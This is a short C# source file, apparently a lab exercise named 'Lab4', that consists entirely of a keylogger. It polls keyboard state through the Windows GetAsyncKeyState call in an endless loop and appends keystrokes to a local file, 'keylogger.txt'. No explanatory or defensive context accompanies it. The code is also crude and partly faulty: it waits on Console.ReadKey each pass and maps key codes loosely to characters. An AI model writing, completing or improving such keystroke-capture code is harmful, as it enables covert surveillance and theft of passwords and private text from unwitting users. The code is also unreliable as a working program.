using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Lab4
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main()
        {

            while (true)
            {

                StreamWriter log = new StreamWriter("keylogger.txt", true);
                char key = ' ';
                for (int i = 0; i < 100; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        key = Convert.ToChar(i);
                    }
                }
                log.Write(key);
                Console.ReadKey();
                log.Close();
            }
        }
    }
}